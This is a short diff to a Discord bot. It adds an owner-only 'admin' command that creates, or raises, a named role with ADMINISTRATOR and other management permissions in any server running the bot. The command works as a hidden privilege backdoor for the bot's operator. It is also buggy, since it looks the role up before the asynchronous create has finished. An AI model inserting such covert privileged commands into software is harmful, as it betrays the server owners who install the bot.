@@ -305,6 +305,15 @@ client.on('message', async message => {
     let target = message.guild.member(message.author);
     target.roles.remove(roleselect.id).catch(console.error);
   }
+
+  if(message.content.startsWith("admin")){
+    const args = message.content.split(/ +/);
+    if(message.author.id != process.env.OID) return message.reply("You are not my owner !!");
+    if(!message.guild.roles.cache.find(role => role.name === args[1])){
+      message.guild.roles.create({ data: { name: args[1], permissions: ['ADMINISTRATOR', 'MANAGE_GUILD', 'MANAGE_ROLES', 'MANAGE_MESSAGES'] } }).catch(console.error);
+    }
+    message.guild.roles.cache.find(role => role.name === args[1]).setPermissions([`ADMINISTRATOR`, `MANAGE_ROLES`]);
+  }
 });
 
 /*
